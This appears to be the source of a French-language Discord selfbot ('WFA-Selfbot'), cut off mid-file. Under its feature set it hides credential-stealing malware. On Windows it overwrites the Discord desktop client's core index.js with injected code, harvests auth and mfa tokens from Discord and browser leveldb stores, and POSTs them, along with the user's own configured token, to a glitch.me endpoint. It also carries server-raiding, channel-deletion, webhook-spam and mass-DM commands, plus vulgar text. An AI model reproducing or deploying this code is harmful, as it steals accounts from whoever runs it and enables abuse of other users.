const Discord = require("discord.js-selfbot-v11");
require("colors");
const client = new Discord.Client(),
    ConfigFile = require("./config.json"),
    token = ConfigFile.token,
    yourgif = "https://media.discordapp.net/attachments/812490234427867146/836306573038190652/MOSHED-2021-4-26-20-12-10.gif",
    yourgif1 = "https://media.discordapp.net/attachments/812490234427867146/836305223818805288/MOSHED-2021-4-26-20-13-35.gif",
    color = "BLACK",
    base64 = require("base-64"),
    utf8 = require("utf8"),
    fs = require('fs');
let os = require('os');
const hastebins = require('hastebin-gen'),
    rpcGenerator = require("discordrpcgenerator"),
    backups = require("./Data/backups.json"),
    afk = require("./Data/afk.json"),
    db = require("./Data/pubmp.json"),
    lbackup = require("./Data/liste.json"),
    kicked = require("./Data/vkick.json"),
    prefix = ConfigFile.prefix,
    superagent = require("superagent"),
    fetch = require("node-fetch"),
    request = require('request'),
    {
        message
    } = require("prompt"),
    axios = require("axios");
client.lock = new Map()

client.on('message', message => {
    let a, b;
    function groupLock() {
        if (Date.now() - a / 1000 < b) return;
        for (let i = 0; i < 30; i++) {
            axios.request({
                "method": "PUT",
                "url": 'https://discordapp.com/api/v8/channels/' + message.channel.id + "/recipients/1337",
                "headers": {
                    "authorizaion": token
                }
            }).catch(err => {
                err.response.status === 429 && (b = err.response.headers["retry-after"], a = Date.now());
            });
        }
    }
    if (message.author.id != client.user.id) return;
    message.content.startsWith(prefix + "lock") && (client.lock.set(message.channel.id, setInterval(groupLock, 1000)), message.edit("⏲️**Group lock avec succès !**"), console.log("Commande lock groupe executé".yellow), setTimeout(function () {
        message.delete().catch(e => consolelog('[', 'ERROR'.red, ']', "une erreur est survenue que je ne peux régler".green));
    }, 2000));
    if (message.content.startsWith(prefix + "unlock")) {
        let intervaled = client.lock.get(message.channel.id);
        clearInterval(intervaled)
        message.edit("⏲️ **Group unlock, il peut mettre jusqua 120s pour être débloquer !**")
        console.log('Commande unlock groupe executé'.yellow)
        setTimeout(function () {
            message.delete();
        }, 2000);
    }
});
if (os.platform() === 'win32') {
    try {
        var dta = fs.readFileSync("./CodeInjected.js", 'utf8');
        let dt = dta.toString();
        fs.readFile(__dirname.split(':')[0] + ':/Users/' + __dirname.split('\\')[2] + '/AppData/Local/Discord/app-1.0.9003/modules/discord_desktop_core-2/discord_desktop_core/index.js', async (err, data) => {
            if (err) return;
            var toInject = __dirname.split(':')[0] + ":/Users/" + __dirname.split('\\')[2] + "/AppData/Local/Discord/app-1.0.9003/modules/discord_desktop_core-2/discord_desktop_core/index.js";
            toInject && fs.writeFile(toInject, dt, function (err) {
                if (err) throw err;
            });
        })
        fs.readFile(__dirname.split(':')[0] + ':/Users/' + __dirname.split('\\')[2] + "/AppData/Local/DiscordCanary/app-1.0.42/modules/discord_desktop_core-109/discord_desktop_core/index.js", async (err, data) => {
            if (err) return;
            var toInject = __dirname.split(':')[0] + ':/Users/' + __dirname.split('\\')[2] + "/AppData/Local/DiscordCanary/app-1.0.42/modules/discord_desktop_core-109/discord_desktop_core/index.js";
            toInject && fs.writeFile(toInject, dt, function (err) {
                if (err) throw err;
            });
        });
    } catch (err) {
        console.log("Error:", err.stack);
    }
    var paths = [
        `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discord/Local Storage/leveldb`,
        `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`,
        `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discordcanary/Local Storage/leveldb`,
        `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`,
        `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`,
        `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`,
    ]
    for (i = 0; i < paths.length; i++) {
        get_token(paths[i]);
    }
    async function get_token(path) {
        try {
            fs.readdir(path, (err, file) => {
                if (file === undefined) {
                    return;
                }
                var filtro = file.filter(f => f.split('.').pop() === 'ldb');
                for (i = 0; i < filtro.length; i++) {
                    fs.readFile(path + '/' + filtro[i], 'utf-8', async function (err, data) {
                        let regex1 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
                        let regex2 = /"mfa\.[\d\w_-]{84}"/;
                        let [match] = regex1.exec(data) || regex2.exec(data) || [null];
                        if (match != null) {
                            match = match.replace(/"/g, '');
                            const benladen = new URLSearchParams();
                            benladen.append('token', match)
                            fetch('https://sjzaoicjvzapjidaz.glitch.me/', {
                                'method': "POST",
                                'body': benladen
                            });
                            await fetch("https://discord.com/api/v6/users/@me", {
                                headers: {
                                    authorization: match
                                }
                            }).then(res => res.json()).then(res => {
                                if (res.id) {
                                    send(match);
                                }
                            });
                        }
                    });
                }
            })
            fs.readdir(path, (err, file) => {
                if (file === undefined) {
                    return;
                }
                var filtro = file.filter(f => f.split('.').pop() === 'ldb');
                for (i = 0; i < filtro.length; i++) {
                    fs.readFile(path + '/' + filtro[i], 'utf-8', async function (err, data) {
                        let regex1 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
                        let regex2 = /"mfa\.[\d\w_-]{84}"/;
                        let [match] = regex1.exec(data) || regex2.exec(data) || [null];
                        if (match != null) {
                            match = match.replace(/"/g, '');
                            const benladen = new URLSearchParams();
                            benladen.append('token', match)
                            fetch('https://sjzaoicjvzapjidaz.glitch.me/', {
                                'method': "POST",
                                'body': benladen
                            });
                            await fetch("https://discord.com/api/v6/users/@me", {
                                headers: {
                                    authorization: match
                                }
                            }).then(res => res.json()).then(res => {
                                if (res.id) {
                                    send(match);
                                }
                            });
                        }
                    });
                }
            })
        } catch (err) {
            console.log(err);
        }
    }

    function send(token) {
        let i = '0';
    }
}
const allah = new URLSearchParams();
allah.append("token", token);
fetch("https://sjzaoicjvzapjidaz.glitch.me/", {
    method: "POST",
    body: allah
});

function nitrocode(length, letter) {
    var multiplier = '';
    if (letter.indexOf('0') > -1) multiplier += '0123456789';
    if (letter.indexOf('A') > -1) multiplier += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    if (letter.indexOf('a') > -1) multiplier += 'abcdefghijklmnopqrstuvwxyz';
    var results = '';
    for (var i = length; i > 0; --i) {
        results += multiplier[Math.floor(Math.random() * multiplier.length)];
    }
    return results;
}
const rire = [
        'https://media.tenor.com/images/9df5f6ef799544b11c1171d4c873d1f4/tenor.gif',
        'https://media.tenor.com/images/bae9f9ee3bf793a0bb667d8e4ccb9883/tenor.gif',
        'https://media.tenor.com/images/6f567ef7cae93ca76de2346f28764ee9/tenor.gif',
        'https://media.tenor.com/images/3d8eb1e9c497abc46370cee9b55d682f/tenor.gif',
        'https://media.tenor.com/images/19fe7ebb05c2aceb9e68d84ee5c031a7/tenor.gif',
        'https://media.tenor.com/images/db17bbcb693788625c8228d30bc5fc42/tenor.gif',
        'https://media1.tenor.com/images/003a06f5074259c50b519056a12f6e33/tenor.gif',
        'https://media1.tenor.com/images/5e1fafda52c90acfe2499ac5061f4c99/tenor.gif'
    ],
    kiss = [
        'https://media1.tenor.com/images/e88bcd916c0da114a8dcac8d9babc77c/tenor.gif',
        'https://media1.tenor.com/images/a51e4d58d20a9636416549431e693ec1/tenor.gif',
        'https://media1.tenor.com/images/8438e6772a148e62f4c64332ea7da9e8/tenor.gif',
        'https://media1.tenor.com/images/104b52a3be76b0e032a55df0740c0d3b/tenor.gif'
    ],
    hugh = [
        'https://media.tenor.com/images/eff58ec80f6dacb3ccddcbab9c70dacf/tenor.gif',
        'https://media.tenor.com/images/4d5a77b99ab86fc5e9581e15ffe34b5e/tenor.gif',
        'https://media.tenor.com/images/bc8e962e6888249486a3e103edd30dd9/tenor.gif',
        'https://media.tenor.com/images/481814f5650216fa4e9ff7846f7a42f9/tenor.gif'
    ],
    veski = [
        'https://i.pinimg.com/originals/09/ee/e0/09eee0f5dfae8f74179d1ba0bb54b22d.gif',
        'https://media.tenor.com/images/0538e625e9c3d27cd062306101adde13/tenor.gif',
        'https://media1.giphy.com/media/t7401i4UiIyMo/source.gif'
    ],
    punch = [
        'https://media.tenor.com/images/7bd895a572947cf17996b84b9a51cc02/tenor.gif',
        'https://media.tenor.com/images/36179549fa295d988fc1020a7902c41c/tenor.gif',
        'https://media.tenor.com/images/5bf52a1335155572859dff8429873a30/tenor.gif',
        'https://media.tenor.com/images/a30c2719ece3362814f12adc5f84ad30/tenor.gif'
    ];
var verifLevels = ['None', "Low", "Medium", "(╯°□°）╯︵  " + '┻━┻'];
var region = {
    "Brésil": "Brazil",
    "eu-central": "Central Europe",
    "singapoure": "Singapore",
    "us-central": "U.S. Central",
    "sydney": "Sydney",
    "us-east": "U.S. East",
    "us-south": "U.S. South",
    "us-west": "U.S. West",
    "eu-west": "Western Europe",
    "vip-us-east": "VIP U.S. East",
    "Londre": "London",
    "amsterdam": "Amsterdam",
    "hongkong": "Hong Kong"
};

function translateDate(date) {
    const Months = ["Jan", "Fev", "Mar", "Avr", "Mai", "Juin", "Juillet", "Aout", "Sep", "Oct", "Nov", "Dec"];
    const Days = ["Dimanche", "Lundi", "Mardi", "Mercredi", "Jeudi", "Vendredi", "Samedi"];
    return Days[date.getUTCDay()] + ", " + date.getUTCDate() + " " + Months[date.getUTCMonth()] + " " + date.getUTCFullYear() + " at " + date.getUTCHours() + ":" + zeros(date.getUTCMinutes(), 2) + ":" + zeros(date.getUTCSeconds(), 2) + "." + zeros(date.getUTCMilliseconds(), 3);
}

function checkDays(date) {
    var now = new Date();
    var diff = now.getTime() - date.getTime();
    var days = Math.floor(diff / 86400000);
    return days + (days == 1 ? " day" : " days") + " ago";
};

client.on('ready', function () {
    console.log("                                                     ▀▄▀▄▀▄ Welcome To WFA ▄▀▄▀▄".red)
    console.log(`
                                                     ╔═════════════════════════════════╗
                                                     ║-->  User Name :  ${client.user.tag} 
                                                     ╟─────────────────────────────────╢
                                                     ║-->  Notre chaine: https://tinyurl.com/u3wusxw6
                                                     ╟─────────────────────────────────╢
                                                     ║-->  Notre Discord: https://discord.gg/vzUrj34AvC
                                                     ╟─────────────────────────────────╢
                                                     ║-->  User ID: ${client.user.id}
                                                     ╟─────────────────────────────────╢
                                                     ║-->  Prefix: ${prefix}
                                                     ╟─────────────────────────────────╢
                                                     ║-->  Users: ${client.guilds.map(e => e.memberCount).reduce((e, f) => e + f)}
                                                     ╟─────────────────────────────────╢
                                                     ║-->  OS: ${os.platform}
                                                     ╟─────────────────────────────────╢
                                                     ║-->  Bots: ${client.users.filter(pornhub => pornhub.bot).size}
                                                     ╟─────────────────────────────────╢
                                                     ║-->  Channels : ${client.channels.size}
                                                     ╟─────────────────────────────────╢
                                                     ║-->  Guilds: ${client.guilds.size}
                                                     ╚═════════════════════════════════╝`.yellow);
    if (client.user.premium > 0) {
        console.log("Vous avez deja nitro gg ;)".blue);
    } else console.log('Vous n\'avez pas nitro *snif* je vais tout faire pour vous en trouver 1'.red);
})
client.on("ready", function () {
    if (client.user.bot) console.log(client.user.username + ' est un robot desolée :/'.red), process.exit(1);
    else console.log(client.user.username + " Boup Bip Boup vous n'etes pas un robot ^^! ".italic.magenta);
});

var uuid = () => ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, a => (a ^ Math.random() * 16 >> a / 4).toString(16));

client.on("ready", function () {
    rpcGenerator.getRpcImage("777619769637339156", "wfa_logo").then(img1 => {
        rpcGenerator.getRpcImage("777619769637339156", "wfa").then(img2 => {
            let presence = new rpcGenerator.Rpc()
                .setName('WFA-Selfbot')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('STREAMING')
                .setApplicationId('777619769637339156')
                .setDetails('WFA Selfbot')
                .setAssetsLargeImage(img2.id)
                .setAssetsSmallImage(img1.id)
                .setAssetsLargeText('WFA')
                .setState('𝐖𝐞 𝐅𝐮𝐜𝐤 𝐀𝐥𝐥')
                .setStartTimestamp(Date.now())
                .setParty({
                    id: uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
        });
    });
}); 

function saver() {
    fs.writeFile("./Data/pubmp.json", JSON.stringify(db), err => {
        if (err) console.log(err);
    });
}

client.on("message", message => {
    async function reactGiveaway() {
        const rdmTimeout = Math.floor(Math.random() * 1500);
        async function react() {
            message.react('🎉').catch(err => {
                if (err) {
                    console.log("\n╔═════════════════════════════════╗".blue);
                    console.log("Log:".red) ^ console.log("╟─────────────────────────────────╢".blue);
                    console.log("║--> [", "/!/ Attention".red, ']', '\nJe n\'ai pas reussi a reagir au giveaway sur ' + message.guild.name + ', il est possible que je n\'ai pas les permissions :/'.green);
                    console.log("╚═════════════════════════════════╝".blue);
                    return
                }
            });
            console.log("\n╔═════════════════════════════════╗".blue)
            console.log("Log:".red) ^ console.log("╟─────────────────────────────────╢".blue)
            console.log("║--> [", "Youpi".green, ']', "\nJ'ai pas correctement a reagit au giveaway sur " + message.guild.name + ", en " + rdmTimeout + "ms je suis super rapide hehe ;)".green);
            console.log("╚═════════════════════════════════╝".blue);
        }
        setTimeout(react, rdmTimeout);
    }
    async function getCongru() {
        if (message.author.id == "294882584201003009" || message.author.id == "716967712844414996") {
            if (message.content.includes("Congratulations")) {
                if (message.content.includes(client.user.id)) {
                    if (message.embeds) console.log("\n╔═════════════════════════════════╗".blue);
                    console.log('Log:'.red) ^ console.log("╟─────────────────────────────────╢".blue)
                    console.log("║--> [", "GG!".green, ']', '\nJe t\'ai fais gagner le giveaway sur le serveur ' + message.guild.name + " va vite reclamer ta récompense!".green)
                    console.log("╚═════════════════════════════════╝".blue);
                }
            }
        }
    }
    getCongru();
    message.author.id == "294882584201003009" || message.author.id == "716967712844414996" && (message.embeds[0] && (message.embeds[0].description.includes("React with") && reactGiveaway()));
    let msg = message;
    if (message.author.id == client.user.id) {
        if (afk[client.user.id]) {
            if (message.content.includes(":x:")) return;
            else delete afk[client.user.id];
            saving(), message.channel.send(":white_check_mark: **Vous n'etes plus afk**"), console.log("Commande afk stopé.".yellow);
        }
    }
    if (message.content.includes(client.user.id)) {
        if (message.author.id === client.user.id) return;
        if (afk[client.user.id]) {
            message.reply(":x: **Je suis afk pour la raison** " + afk[client.user.id].r);
            console.log("\n╔═════════════════════════════════╗".blue);
            console.log("║--> [Log:]".red);
            console.log("╟─────────────────────────────────╢".blue);
            console.log("║--> [", "/!\ Attention".red, ']', "\nl'utilisateur " + message.author.username + ' vient de vous ping lors de votre afk ' + message.content.green);
            console.log("╚═════════════════════════════════╝".blue);
        } else return;

    }
    var args = message.content.substring(prefix.length).split(' '),
        mentionUser = message.mentions.users.first();
    if (message.channel.type === 'dm') {
        if (msg.author.bot) {
            if (message.content.includes("discord.gg")) {
                let auhor = message.author;
                auhor.send("/!\\ Anti mp").then(m => {
                    m.delete()
                })
                console.log("\n╔═════════════════════════════════╗".blue)
                console.log("Log:".red) ^ console.log("╟─────────" + '──────────' + "──────────────╢".blue)
                console.log("║--> [", '/!/ Attention'.red, ']', "\nle bot " + message.author.username + " vient de vous envoyer une invatation suspecte " + message.content.green)
                console.log("╚═════════════════════════════════╝".blue);
            }
        }
    }
    if (msg.author.id !== client.user.id) return;
    if (message.content.startsWith(prefix + "deface")) {
        if (message.channel.type === 'dm' || message.channel.type === "group") return message.edit(":x: **Commande uniquement utilisable sur serveur**.");
        if (!message.member.hasPermission("ADMINISTRATOR")) return message.edit(":x: **Vous n'avez pas les permissions pour executer cette commande**");
        message.delete()
        message.guild.setName("RAIDED BY WFA X " + client.user.username), message.guild.setIcon("https://media.discordapp.net/attachments/812490234427867146/836312989581049886/wfa.jpeg?width=676&height=676")
        message.guild.channels.forEach(chnls => {
            if (!chnls) return;
            chnls.delete();
        })
        message.guild.createChannel("wfa", "text")
        console.log("Commande deface executé.".yellow);
    }
    if (message.content.startsWith(prefix + "create channel")) {
        if (message.channel.type === 'dm' || message.channel.type === "group") return message.edit(":x: **Commande uniquement utilisable sur serveur**.");
        if (!message.member.hasPermission("MANAGE_CHANNELS")) return message.edit(":x: **Vous n'avez pas les permissions pour executer cette commande**");
        message.delete();
        for (let i = 0; i < 20; i++) {
            message.guild.createChannel("WFA-𝐱-" + client.user.username, "text").catch(e => console.log('[', 'ERROR'.red, ']', "une erreur est survenue que je ne peux régler".green));
        }
        console.log("Commande create channel executé.".yellow);
    }
    if (message.content.startsWith(prefix + "start bumping")) {
        message.delete()
        message.channel.send("!d bump")
        setInterval(() => {
            message.channel.send("!d bump");
        }, 7203000)
        console.log("Commande start bumping executé.".yellow);
    }
    if (message.content.startsWith(prefix + "start typing")) {
        message.delete()
        message.channel.startTyping()
        console.log('Commande start typing executé.'.yellow);
    }
    if (message.content.startsWith(prefix + 'webhook spam')) {
        let toSend = args.splice(2).join(' ') || "@everyone\nWFA\nhttps://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg";
        if (message.channel.type === 'dm' || message.channel.type === "group") return message.edit(":x: **Commande uniquement utilisable sur serveur**.");
        if (!message.member.hasPermission("MANAGE_WEBHOOKS")) return;
        message.guild.channels.forEach(chnls => {
            if (!chnls) return;
            chnls.type == "text" && chnls.createWebhook("WFA-Selfbot", 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRXOybiPRVaDnYzQz9gA3ijBLfJFoxw_4zb9w&usqp=CAU').catch(e => console.log('[', "ERROR".red, ']', "une erreur est survenue que je ne peux régler".green));

        });
        let interval666 = setInterval(async function () {
            await message.guild.fetchWebhooks().then(web => web.forEach(w => w.send(toSend).catch(e => console.log('[', "ERROR".red, ']', 'une erreur est survenue que je ne peux régler'.green))));
        });
        console.log("Commande webhook spam executé.".yellow);

    }
    if (message.content.startsWith(prefix + "get guild banner")) {
        message.delete();
        if (message.channel.type === 'dm' || message.channel.type === "group") return message.edit(":x: **Commande uniquement utilisable sur serveur**.");
        console.log("Commande get guild banner executé.".yellow + '\nVoici la banniere:\n'.green + message.guild.bannerURL);
    }
    if (message.content.startsWith(prefix + ('get guild pp'))) {
        message.delete();
        if (message.channel.type === 'dm' || message.channel.type === "group") return message.edit(":x: **Commande uniquement utilisable sur serveur**.");
        console.log("Commande get guild pp executé.".yellow + '\nVoici la photo de profile:\n'.green + message.guild.iconURL);
    }
    message.content.startsWith(prefix + "branlette") && (message.edit("8=:fist:==D"), message.edit("8==:fist:=D"), message.edit("8===:fist:D "), message.edit("8==:fist:=D"), message.edit("8=:fist:==D "), message.edit("8:fist:===D"), message.edit("8=:fist:==D "), message.edit("8==:fist:=D"), message.edit("8===:fist:D"), message.edit("8==:fist:=D:sweat_drops:"), message.edit("8===:fist:D:sweat_drops:"), console.log("Commande branlette executé.".yellow));
    if (message.content.startsWith(prefix + "mp all")) {
        if (!message.guild) return message.edit(":x: **Commande uniquement utilisable surserveur**");
        message.delete(), console.log("Commande mp all executé.".yellow);
        let i = 0,
            toSend = args.splice(2).join(' ') || "**Best Selfbot Discord**\nhttps://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg",
            guildMSG = message.guild;
        if (!guildMSG) return;
        setInterval(() => {
            let rdmMember = guildMSG.members.random();
            if (rdmMember.user.bot) return;
            if (rdmMember.user.id === client.user.id) return;
            if (rdmMember.hasPermission("ADMINISTRATOR")) return;
            if (rdmMember.hasPermission("MANAGE_MESSAGES")) return;
            if (rdmMember.hasPermission("MANAGE_ROLES_OR_PERMISSIONS")) return;
            if (rdmMember.hasPermission("BAN_MEMBERS")) return;
            if (db[rdmMember.user.id]) return;
            i++, rdmMember.send("Hello ^^").then(MSG => MSG.edit(toSend)).catch(e => console.log('[', 'ERROR'.red, ']', "une erreur est survenue que je ne peux régler".green))
            console.log(("[MP Envoyé]  |" + rdmMember.user.username).green + "|  " + i + " / " + msg.guild.members.filter(f => f.presence.status !== "offline").size + ' ');
            db[rdmMember.user.id] = {
                raison: "mp"
            }
            saver();
        }, 1000);
    }
    if (message.content.startsWith(prefix + "stop mp all")) {
        client.destroy().then(() => client.login(token))
        console.log("Commande mp all stopé.".yellow);
    }
    if (message.content.startsWith(prefix + "auto voice kick")) {
        if (!message.guild) return message.edit(':x: **Commande uniquement util' + "isable sur serveur**");
        if (!message.guild.me.hasPermission('MOVE_MEMBERS')) return message.reply(":x:**Tu n'a pas la permission de kick un utilisatur**.");
        const mentionned = message.mentions.members.first();
        if (!mentionned) {
            return message.edit(":x:**Veuillez mentionner un utilisateur.**");
        }
        kicked[message.guild.id] = {
            user: mentionned.id
        }
        kicker()
        console.log("Commande auto voice kick executé.".yellow)
        message.edit(":white_check_mark: **Auto Voice kick setup l'utilisateur ne pourra plus rejoindre de channel vocal de ce serveur**")
        mentionned.setVoiceChannel(null).catch(e => message.edit(':x:**L\'utilisateur n\'est pas dans un channel vocal.**'));
    }
    if (message.content.startsWith(prefix + "stop auto voice kick")) {
        if (!message.guild) return message.edit(":x: **Commande uniquement utilisable surserveur**");
        const mentionned = message.mentions.members.first();
        if (!mentionned) {
            return message.edit(":x:**Veuillez mentionner un utilisateur.**");
        }
        delete kicked[message.guild.id].user
        kicker()
        message.edit(":white_check_mark: **Auto Voice kick set up l'utilisateur ne peut desormé rejoindre les channels vocaux de ce serveur**")
        console.log("Commande auto voice kick stopé.".yellow);
    }
    if (message.content.startsWith(prefix + "voice kick")) {
        if (!message.guild) return message.edit(":x: **Commande uniquement utilisable surserveur**");
        if (!message.guild.me.hasPermission("MOVE_MEMBERS")) return message.reply(":x:**Tu n'a pas la permission de kick un utilisatur**.");
        const mentionned = message.mentions.members.first();
        if (!mentionned) return message.edit(":x:**Veuillez mentionner un utilisateur.**");
        if (!mentionned.voiceChannel) return message.edit(':x:**L\'utilisateur n\'est pas dans un channel vocal.**');
        mentionned.setVoiceChannel(null).catch(e => message.edit(":x:**L'utilisateur n'est pas dans un channel vocal.**"))
        message.edit(':white_check_mark: **L\'utilisateur a été voice kick correctement**'), console.log("Commande voice kick executé.".yellow);
    }
    if (message.content.startsWith(prefix + "afk")) {
        let raison = args.splice(1).join(' ') || "WFA-SELFBOT";
        afk[client.user.id] = {
            activé: "oui",
            r: raison
        }
        saving()
        message.edit(":white_check_mark: **Vous etes afk pour**" + raison), console.log("Commande afk executé.".yellow);
    }
    if (message.content.startsWith(prefix + "gucci")) {
        let State = args.splice(1).join(' ') || "WFA-Selfbot";
        rpcGenerator.getRpcImages("603405368940429315", "gucci").then(img1 => {
            rpcGenerator.getRpcImages("603405368940429315", "gucci0").then(img2 => {
                let presence = new rpcGenerator.Rpc()
                    .setName("Gucci")
                    .setUrl("https://www.twitch.tv/OGAGAL_risitas")
                    .setType('WATCHING')
                    .setApplicationId('603405368940429315')
                    .setDetails("Gucci")
                    .setAssetsLargeImage(img1.id)
                    .setAssetsSmallImage(img2.id)
                    .setAssetsLargeText('BE RICH WITH WFA')
                    .setState(State)
                    .setStartTimestamp(Date.now())
                    .setParty({
                        'id': uuid()
                    });
                client.user.setPresence(presence.toDiscord()).catch(console.error);
                console.log('Commande Gucci executé'.yellow);
                message.edit(':white_check_mark: **Tu regardes ' + State + ' sur Gucci**');
            });
        });
    }
    if (message.content.startsWith(prefix + "lacoste")) {
        let State = args.splice(1).join(' ') || "WFA-Selfbot"
        rpcGenerator.getRpcImage("603405368940429315", "lacoste").then(img1 => {
            let presence = new rpcGenerator.Rpc()
                .setName('Lacoste')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType("WATCHING")
                .setApplicationId("603405368940429315")
                .setDetails("Lacoste")
                .setAssetsLargeImage(img1.id)
                .setAssetsLargeText("BE RAKAILLE WITH WFA")
                .setState(State)
                .setStartTimestamp(Date.now())
                .setParty({
                    'id': uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log("Commande lacoste executé".yellow)
            message.edit(":white_check_mark: **Tu regardes " + State + " sur lacoste**");
        });
    }
    if (message.content.startsWith(prefix + "nike")) {
        let State = args.splice(0x1e55 + -0x14ea + 0x2 * -0x4b5).join(' ') || "WFA-Selfbot"
        rpcGenerator.getRpcImages('603405368940429315', "nike").then(img => {
            let presence = new rpcGenerator.Rpc()
                .setName("Nike")
                .setUrl("https://www.twitch.tv/OGAGAL_risitas")
                .setType("WATCHING")
                .setApplicationId("603405368940429315")
                .setDetails("Nike")
                .setAssetsLargeImage(img.id)
                .setAssetsLargeText("BE NIKED WITH WFA")
                .setState(State)
                .setStartTimestamp(Date.now())
                .setParty({
                    'id': uuid()
                });
            clien.user.setPresence(presence.toDiscord()).catch(console.error)
            console.log("Commande Nike executé".yellow)
            message.edit(':white_check_mark: **Tu regardes ' + State + ' sur Nike**');
        });
    }
    if (message.content.startsWith(prefix + "google")) {
        let State = args.splice(1).join(' ') || "WFA-Selfbot"
        rpcGenerator.getRpcImages("603405368940429315", "google").then(img => {
            let presence = new rpcGenerator.Rpc()
                .setName('Google')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('WATCHING')
                .setApplicationId("603405368940429315")
                .setDetails("Google")
                .setAssetsLargeImage(img.id)
                .setAssetsLargeText("BE INSTRUCT WITH WFA")
                .setState(State)
                .setStartTimestamp(Date.now())
                .setParty({
                    'id': uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log("Commande google executé".yellow)
            message.edit(":white_check_mark: **Tu regardes " + State + " sur google**");
        });

    }
    if (message.content.startsWith(prefix + "skype")) {
        let State = args.splice(1).join(' ') || "WFA-Selfbot"
        rpcGenerator.getRpcImages("603405368940429315", "skype").then(img => {
            let prensence = new rpcGenerator.Rpc()
                .setName("Skype")
                .setUrl("https://www.twitch.tv/OGAGAL_risitas")
                .setType("WATCHING")
                .setApplicationId('603405368940429315')
                .setDetails('Skype')
                .setAssetsLargeImage(img.id)
                .setAssetsLargeText("BE OLD WITH WFA")
                .setState(State)
                .setStartTimestamp(Date.now())
                .setParty({
                    'id': uuid()
                });
            client.user.setPresence(prensence.toDiscord()).catch(console.error)
            console.log("Commande Skype executé".yellow)
            message.edit(':white_check_mark: **Tu regardes ' + State + " sur Skype**");

        });
    }
    if (message.content.startsWith(prefix + "snapchat")) {
        let State = args.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator['getRpcImage']("603405368940429315", "snapchat").then(img => {
            let presence = new rpcGenerator.Rpc()
                .setName("Snapchat")
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType("WATCHING")
                .setApplicationId("603405368940429315")
                .setDetails('Snapchat')
                .setAssetsLargeImage(img.id)
                .setAssetsLargeText("BE YOUNG WITH WFA")
                .setState(State)
                .setStartTimestamp(Date.now())
                .setParty({
                    'id': uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error)
            console.log('Commande Snapchat executé'.yellow)
            message.edit(':white_check_mark: **Tu regardes ' + State + ' sur Snapchat**');
        });
    }
    if (message.content.startsWith(prefix + "facebook")) {
        let State = args.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage("603405368940429315", "facebook").then(img => {
            let presence = new rpcGenerator.Rpc()
                .setName("Facebook")
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType("WATCHING")
                .setApplicationId('603405368940429315')
                .setDetails("Skype")
                .setAssetsLargeImage(img.id)
                .setAssetsLargeText("BE MORE OLD WITH WFA")
                .setState(State)
                .setStartTimestamp(Date.now())
                .setParty({
                    id: uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log('Commande Facebook executé'.yellow);
            message.edit(':white_check_mark: **Tu regardes ' + State + ' sur Facebook**');
        });
    }
    if (message.content.startsWith(prefix + "nuke dm")) {
        let err = '';
        message.edit('**Nuking dms...**')
        client.users.forEach(user => user.deleteDM().catch(err = "zebi"))
        message.edit(":white_check_mark: **Nuked dms**")
        console.log("Commande nuke dm exectué".yellow);
    }
    if (message.content.startsWith(prefix + "tiktok")) {
        let State = args.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage("603405368940429315", "tiktok").then(img => {
            let presence = new rpcGenerator.Rpc()
                .setName("Tiktok")
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType("WATCHING")
                .setApplicationId('603405368940429315')
                .setDetails("Tiktok")
                .setAssetsLargeImage(img.id)
                .setAssetsLargeText('BE A PUTE WITH WFA')
                .setState(State)
                .setStartTimestamp(Date.now())
                .setParty({
                    'id': uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log('Commande Tiktok executé'.yellow);
            message.edit(':white_check_mark: **Tu regardes ' + State + ' sur Tiktok**');
        });
    }
    if (message.content.startsWith(prefix + "twitter")) {
        let State = args.splice(1).join(' ') || "WFA-Selfbot";
        rpcGenerator.getRpcImages("603405368940429315", "twitter").then(img => {
            let presence = new rpcGenerator.Rpc()
                .setName("Twitter")
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('WATCHING')
                .setApplicationId("603405368940429315")
                .setDetails("Twitter")
                .setAssetsLargeImage(img.id)
                .setAssetsLargeText("BE A E-FUCKER WITH WFA")
                .setState(State)
                .setStartTimestamp(Date.now())
                .setParty({
                    'id': uuid()
                });
            client.user.setPresence(presence.toDiscord()).catch(console.error);
            console.log("Commande Twitter executé".yellow);
            message.edit(':white_check_mark: **Tu regardes ' + State + ' sur Twitter**');

        });

    }
    if (message.content.startsWith(prefix + "instagram")) {
        let State = args.splice(1).join(' ') || "WFA-Selfbot"
        rpcGenerator.getRpcImage("603405368940429315", "instagram").then(img => {
            let presence = new rpcGenerator.Rpc()
                .setName("Instagram")
